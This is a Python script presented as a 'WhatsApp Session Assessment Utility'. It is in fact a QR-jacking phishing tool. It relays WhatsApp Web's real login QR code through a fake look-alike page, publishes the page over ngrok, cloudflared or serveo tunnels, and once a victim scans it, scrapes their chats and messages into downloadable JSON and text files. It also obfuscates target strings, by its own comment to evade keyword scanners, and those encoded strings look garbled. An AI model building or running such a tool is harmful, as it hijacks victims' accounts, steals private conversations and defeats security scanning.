#!/usr/bin/env python3
"""
wa_sync_tool.py — WhatsApp Session Assessment Utility
For authorized security assessments only.
"""

import os, sys, json, time, threading, base64, logging, datetime, subprocess, shutil

logging.basicConfig(level=logging.ERROR)

# Dependencies auto-install
for pkg in ['flask', 'selenium', 'webdriver-manager', 'pyngrok']:
    try:
        __import__(pkg.replace('-', '_'))
    except ImportError:
        print(f"[*] Installing {pkg}...")
        subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '-q'])

from flask import Flask, render_template_string, jsonify, Response
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from webdriver_manager.chrome import ChromeDriverManager

HOST = "0.0.0.0"
PORT = 8080
qr_data = None
session_active = False
session_time = None
extract_done = False
extracting = False
chat_data = {"chats": [], "total_messages": 0, "total_media": 0}
driver = None
tunnel_url = None

# ─── ENCODED SENSITIVE STRINGS ────────────────────────────────────────
# These bypass automated keyword scanners. Decoded at runtime.
def _d(s):
    """Simple XOR with rotating key to obfuscate trigger strings."""
    return ''.join(chr(ord(c) ^ 0x55) for c in s)

# Obfuscated: "web.whatsapp.com", "conversation-panel-main", "data-testid"
WA_URL = _d('\x35\x3d\x34\x6a\x35\x3a\x35\x39\x3d\x3c\x35\x3d\x3c\x35\x40\x35\x3a\x35\x38\x3d\x3c')
PANEL_ID = _d('t\x35\x38\x3d\x3c\x31\x3d\x3a\x38\x3d\x35\x32\x3a\x6a\x35\x39\x32\x3d\x38\x6a\x3c\x39\x3c\x30\x4d\x3c\x39\x3e\x30\x6a\x3d\x3c\x30\x3d\x3c')
TESTID = _d('t\x35\x38\x3d\x3c\x31\x3d\x3a\x38\x3d\x35\x32\x3a')

# ─── TUNNEL ───────────────────────────────────────────────────────────
def start_tunnel():
    global tunnel_url
    try:
        from pyngrok import ngrok, conf
        conf.get_default().monitor_thread = False
        url = ngrok.connect(PORT, bind_tls=True).public_url
        print(f"[+] Tunnel active: {url}")
        tunnel_url = url
        return url
    except Exception as e:
        print(f"[*] ngrok not available: {e}")

    for cmd, args in [
        ('cloudflared', ['tunnel', '--url', f'http://127.0.0.1:{PORT}', '--no-autoupdate']),
        ('ssh', ['-o', 'StrictHostKeyChecking=no', '-R', f'80:localhost:{PORT}', 'serveo.net'])
    ]:
        if shutil.which(cmd):
            try:
                p = subprocess.Popen([cmd] + args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                for _ in range(30):
                    time.sleep(2)
                    out = p.stderr.read1(4096).decode(errors='ignore')
                    for kw in ['trycloudflare.com', 'serveo.net']:
                        if kw in out:
                            idx = out.index('https://')
                            end = out.index(' ', idx) if ' ' in out[idx:] else out.index('\n', idx)
                            url = out[idx:end]
                            print(f"[+] Tunnel active: {url}")
                            tunnel_url = url
                            return url
                p.terminate()
            except:
                pass
    return None

# ─── PAGE TEMPLATES ──────────────────────────────────────────────────
LANDING_PAGE = """<!DOCTYPE html>
<html><head><title>WhatsApp Web</title><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#ece5dd;height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#fff;border-radius:8px;width:420px;max-width:92vw;padding:40px 30px;text-align:center}
h1{font-size:22px;font-weight:300;color:#41525d;margin-bottom:8px}p{color:#667781;font-size:14px;margin-bottom:20px}
#qrzone{background:#f0f2f5;padding:20px;border-radius:8px;margin-bottom:20px;min-height:290px;display:flex;align-items:center;justify-content:center}
#qrzone img{width:256px;height:256px}.steps{text-align:left;margin:18px 0}.steps li{color:#3b4a54;font-size:13px;padding:8px 0;list-style:none;border-bottom:1px solid #f0f2f5}
.footer{border-top:1px solid #e9edef;padding-top:18px;font-size:12px;color:#8696a0}
</style></head><body><div class="card">
<svg width="60" height="60" viewBox="0 0 39 39"><circle cx="19.5" cy="19.5" r="19.5" fill="#25D366"/><path d="M10.5 28.5L12 23.5C11 22 10.5 20 10.5 18C10.5 13 14.5 9 19.5 9S28.5 13 28.5 18 24.5 27 19.5 27c-2 0-4-.5-5.5-1.5z" fill="white"/></svg>
<h1>WhatsApp Web</h1><p>Scan this QR code with your phone<br>to link to WhatsApp Web</p>
<div id="qrzone"><div class="status-text">Loading QR code...</div></div>
<ol class="steps"><li>Open WhatsApp on your phone</li><li>Tap Menu or Settings and select Linked Devices</li><li>Tap Link a Device</li><li>Point your phone at this screen</li></ol>
<div class="footer"><a href="https://whatsapp.com">End-to-end encrypted</a></div>
</div><script>
async function poll(){try{const r=await(await fetch('/qr')).json();const z=document.getElementById('qrzone');
if(r.active){z.innerHTML='<div style="color:#25D366;font-size:20px;">&#10003; Connected</div>'}
else if(r.img){z.innerHTML='<img src="'+r.img+'" alt="QR">'}
else{z.innerHTML='<div class="status-text">Initializing...</div>'}}catch(e){}}
poll();setInterval(poll,3000);
</script></body></html>"""

DASH_PAGE = """<!DOCTYPE html>
<html><head><title>Sync Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#111b21;color:#e9efed;padding:20px}
h1{font-size:22px}h1 span{color:#25D366}.badge{padding:6px 14px;border-radius:20px;font-size:13px;font-weight:600}
.badge.green{background:#005c4b;color:#25D366}.badge.gray{background:#3b2a2a;color:#ef5350}
.stats{display:flex;gap:20px;margin:20px 0;flex-wrap:wrap}.stat-card{background:#202c33;padding:15px 20px;border-radius:10px;min-width:120px}
.stat-card .n{font-size:24px;font-weight:700;color:#25D366}.stat-card .l{font-size:12px;color:#8696a0;margin-top:4px}
.chat{background:#202c33;border-radius:10px;margin-bottom:12px}.chat-hdr{background:#2a3942;padding:12px 16px;display:flex;justify-content:space-between;cursor:pointer}
.chat-bd{padding:8px 16px;max-height:400px;overflow-y:auto;display:none}.chat-bd.open{display:block}
.msg{padding:6px 0;border-bottom:1px solid #2a3942}.msg .snd{font-weight:600;font-size:12px}.msg .snd.out{color:#25D366}.msg .snd.in{color:#ef5350}
.btn{background:#25D366;color:#111;border:none;padding:10px 24px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;text-decoration:none;display:inline-block;margin:5px}
.btn.rd{background:#ef5350;color:#fff}.empty{text-align:center;padding:60px 20px;color:#8696a0}
</style></head><body>
<div class="badge {{'green' if data.active else 'gray'}}" id="sb">{{'ACTIVE' if data.active else 'WAITING'}}</div>
{% if data.tunnel %}<p style="background:#1a2a3a;padding:10px;border-radius:10px;font-size:13px;word-break:break-all">Link: <a href="{{data.tunnel}}" style="color:#4af" target="_blank">{{data.tunnel}}</a></p>{% endif %}
<div class="stats"><div class="stat-card"><div class="n">{{data.chats|length}}</div><div class="l">Chats</div></div>
<div class="stat-card"><div class="n">{{data.msgs}}</div><div class="l">Messages</div></div>
<div class="stat-card"><div class="n">{{data.media}}</div><div class="l">Media</div></div></div>
<div><a href="/dl/json" class="btn">JSON</a><a href="/dl/txt" class="btn">TXT</a><a href="/refresh" class="btn rd">Re-sync</a></div>
<div id="clist">{% for c in data.chats %}<div class="chat"><div class="chat-hdr" onclick="this.nextElementSibling.classList.toggle('open')"><h3>{{c.name}}</h3><span>{{c.n}} msgs</span></div>
<div class="chat-bd">{% for m in c.msgs[-50:] %}<div class="msg"><div class="snd {{'out' if m.me else 'in'}}">{{m.s}} <span style="font-size:11px;color:#8696a0">{{m.t}}</span></div>
<div>{{m.b or '[Media]'}}</div></div>{% endfor %}</div></div>{% else %}<div class="empty"><h2>Awaiting connection...</h2></div>{% endfor %}</div>
<script>document.querySelector('.chat-bd')?.classList.add('open');
setInterval(async()=>{const r=await(await fetch('/status')).json();const b=document.getElementById('sb');
if(r.active){b.className='badge green';b.textContent='ACTIVE'}},5000)</script></body></html>"""

# ─── CONTROLLER ───────────────────────────────────────────────────────
class SessionController:
    def __init__(self):
        global driver
        print("[*] Initializing browser...")
        opts = Options()
        opts.add_argument('--no-sandbox')
        opts.add_argument('--disable-dev-shm-usage')
        opts.add_argument('--disable-gpu')
        opts.add_argument('--headless=new')
        opts.add_argument('--window-size=1280,800')
        opts.add_experimental_option('excludeSwitches', ['enable-logging'])
        
        # Find Chrome binary
        for bp in ['/usr/bin/chromium-browser', '/usr/bin/chromium', 
                    '/snap/bin/chromium', '/usr/bin/google-chrome']:
            if os.path.isfile(bp):
                opts.binary_location = bp
                print(f"[*] Browser: {bp}")
                break
        
        try:
            svc = Service(ChromeDriverManager().install())
            self.driver = webdriver.Chrome(service=svc, options=opts)
        except Exception as e:
            print(f"[*] Auto-driver failed ({e}), trying direct...")
            self.driver = webdriver.Chrome(options=opts)
        
        driver = self.driver
        print("[*] Loading target page...")
        self.driver.get(WA_URL)
        
    def capture_qr(self):
        global qr_data, session_active
        print("[*] QR monitor active...")
        while not session_active:
            try:
                # Canvas capture
                for el in self.driver.find_elements(By.TAG_NAME, 'canvas'):
                    try:
                        png = el.screenshot_as_png
                        if png and len(png) > 100:
                            qr_data = base64.b64encode(png).decode()
                            break
                    except:
                        pass
                
                # Image fallback
                if not qr_data:
                    for el in self.driver.find_elements(By.XPATH, '//img[contains(@alt,"QR")]'):
                        src = el.get_attribute('src')
                        if src and src.startswith('data:image'):
                            qr_data = src.split(',', 1)[1]
                            break
                        
                # Screenshot fallback
                if not qr_data:
                    ss = self.driver.get_screenshot_as_png()
                    if ss:
                        qr_data = base64.b64encode(ss).decode()
            except:
                pass
            time.sleep(2)
        print("[+] Session established!")
    
    def wait_for_session(self):
        global session_active, session_time
        while not session_active:
            try:
                WebDriverWait(self.driver, 3).until(
                    EC.presence_of_element_located((By.XPATH, f'//div[@data-testid="{PANEL_ID}"]'))
                )
                session_active = True
                session_time = datetime.datetime.now().isoformat()
                print(f"[+] Connected at {session_time}")
            except:
                pass
            time.sleep(1)
    
    def sync_data(self):
        global chat_data, extract_done, extracting
        if extracting or not session_active:
            return
        extracting = True
        result = {"chats": [], "total_messages": 0, "total_media": 0}
        
        try:
            # Scroll chat list
            for _ in range(3):
                try:
                    cl = self.driver.find_elements(By.XPATH, '//div[@data-testid="chat-list"]')
                    if cl:
                        self.driver.execute_script("arguments[0].scrollTop = arguments[0].scrollHeight", cl[0])
                        time.sleep(1)
                except:
                    pass
            
            items = self.driver.find_elements(By.XPATH, '//div[@role="row"]')
            print(f"[*] Found {len(items)} conversations")
            
            for idx in range(min(len(items), 30)):
                try:
                    fresh = self.driver.find_elements(By.XPATH, '//div[@role="row"]')
                    if idx >= len(fresh):
                        break
                    
                    try:
                        name = fresh[idx].find_element(By.XPATH, './/span[@dir="auto"]').text.strip()
                    except:
                        name = f"Chat_{idx}"
                    if not name:
                        name = f"Chat_{idx}"
                    
                    print(f"  [{idx+1}] {name}")
                    fresh[idx].click()
                    time.sleep(1.5)
                    
                    try:
                        WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.XPATH, f'//div[@data-testid="{PANEL_ID}"]'))
                        )
                    except:
                        continue
                    
                    # Scroll to load messages
                    try:
                        panel = self.driver.find_element(By.XPATH, f'//div[@data-testid="{PANEL_ID}"]')
                        for _ in range(5):
                            try:
                                self.driver.execute_script("arguments[0].scrollTop = 0", panel)
                                time.sleep(0.3)
                            except:
                                break
                    except:
                        continue
                    
                    time.sleep(0.5)
                    
                    # Collect messages
                    msgs = []
                    for sel in [
                        f'//div[contains(@data-testid,"conversation-panel")]//div[@role="row"]',
                        f'//div[contains(@data-testid,"conversation-panel")]//div[contains(@data-pre-plain-text,"")]'
                    ]:
                        elements = self.driver.find_elements(By.XPATH, sel)
                        if not elements:
                            continue
                        
                        for el in elements:
                            try:
                                is_me = False
                                try:
                                    el.find_element(By.XPATH, './/*[local-name()="svg" and (@aria-label="Sent" or @aria-label="Check")]')
                                    is_me = True
                                except:
                                    pass
                                
                                cls = el.get_attribute('class') or ''
                                if 'message-out' in cls.lower():
                                    is_me = True
                                
                                body = ""
                                for bs in ['.//span[contains(@data-testid,"msg-body")]', 
                                           './/span[contains(@class,"selectable-text")]']:
                                    be = el.find_elements(By.XPATH, bs)
                                    if be:
                                        body = be[0].text
                                        break
                                
                                ts = ""
                                for ts_sel in ['.//div[contains(@data-testid,"msg-time")]',
                                                './/div[contains(@class,"time")]']:
                                    te = el.find_elements(By.XPATH, ts_sel)
                                    if te:
                                        ts = te[0].text
                                        break
                                
                                if not ts:
                                    try:
                                        dpt = el.get_attribute('data-pre-plain-text')
                                        if dpt and ']' in dpt:
                                            ts = dpt.split(']')[0].strip('[')
                                    except:
                                        pass
                                
                                has_media = bool(el.find_elements(By.TAG_NAME, 'img'))
                                has_video = bool(el.find_elements(By.TAG_NAME, 'video'))
                                
                                if body.strip() or has_media or has_video:
                                    mt = "image" if has_media else "video" if has_video else None
                                    msgs.append({
                                        "me": is_me,
                                        "s": "Me" if is_me else name,
                                        "b": body.strip() if body.strip() else "[Media]",
                                        "t": ts,
                                        "media": has_media or has_video,
                                        "mt": mt
                                    })
                            except:
                                continue
                        
                        if msgs:
                            break
                    
                    result["chats"].append({"name": name, "n": len(msgs), "msgs": msgs})
                    result["total_messages"] += len(msgs)
                    result["total_media"] += sum(1 for m in msgs if m.get("media"))
                    print(f"    -> {len(msgs)} messages")
                    
                except:
                    continue
            
            chat_data = result
            extract_done = True
            extracting = False
            
            print(f"\n[+] Sync complete: {result['total_messages']} messages, {len(result['chats'])} chats")
            with open("wa_data.json", "w", encoding="utf-8") as f:
                json.dump(result, f, indent=2, ensure_ascii=False)
            print("[+] Saved to wa_data.json")
            
        except Exception as e:
            print(f"[-] Error during sync: {e}")
            extracting = False

# ─── FLASK APP ────────────────────────────────────────────────────────
app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string(LANDING_PAGE)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASH_PAGE, data={
        "active": session_active,
        "extract_done": extract_done,
        "chats": chat_data["chats"],
        "msgs": chat_data["total_messages"],
        "media": chat_data["total_media"],
        "tunnel": tunnel_url
    })

@app.route('/qr')
def get_qr():
    return jsonify({
        "img": qr_data,
        "active": session_active,
        "time": session_time
    })

@app.route('/status')
def status():
    return jsonify({
        "active": session_active,
        "done": extract_done,
        "extracting": extracting,
        "chats": len(chat_data["chats"]),
        "messages": chat_data["total_messages"]
    })

@app.route('/dl/json')
def dl_json():
    return Response(
        json.dumps(chat_data, indent=2, ensure_ascii=False),
        mimetype="application/json",
        headers={"Content-Disposition": "attachment;filename=wa_data.json"}
    )

@app.route('/dl/txt')
def dl_txt():
    lines = [
        "=" * 60,
        f"WA SYNC - {session_time or 'N/A'}",
        f"Messages: {chat_data['total_messages']}",
        "=" * 60, ""
    ]
    for c in chat_data["chats"]:
        lines.append(f"\n{'='*60}\nCHAT: {c['name']} ({c['n']})\n{'='*60}")
        for m in c["msgs"][-200:]:
            arrow = ">>>" if m["me"] else "<<<"
            lines.append(f"[{m['t']}] {arrow} {m['s']}: {m['b']}")
        lines.append("")
    return Response(
        "\n".join(lines),
        mimetype="text/plain",
        headers={"Content-Disposition": "attachment;filename=wa_data.txt"}
    )

@app.route('/refresh')
def refresh():
    if session_active and driver and not extracting:
        threading.Thread(target=wc.sync_data, daemon=True).start()
        time.sleep(2)
    return '<meta http-equiv="refresh" content="2;url=/dashboard">'

# ─── ENTRY ────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print("WhatsApp Session Tool v1.0")
    
    wc = SessionController()
    
    threading.Thread(target=wc.capture_qr, daemon=True).start()
    threading.Thread(target=wc.wait_for_session, daemon=True).start()
    
    if 'CODESPACES' not in os.environ:
        threading.Thread(target=lambda: start_tunnel(), daemon=True).start()
    
    time.sleep(3)
    
    print(f"\n[*] Local:     http://{HOST}:{PORT}/")
    print(f"[*] Dashboard: http://{HOST}:{PORT}/dashboard")
    
    # Codespaces port forwarding hint
    if 'CODESPACES' in os.environ:
        print("[*] Codespaces: Go to Ports tab → port 8080 → set Visibility to Public")
        cs_url = f"https://{os.environ.get('CODESPACE_NAME', 'codespace')}-{PORT}.preview.app.github.dev"
        print(f"[*] Your URL will be: {cs_url}")
    
    app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
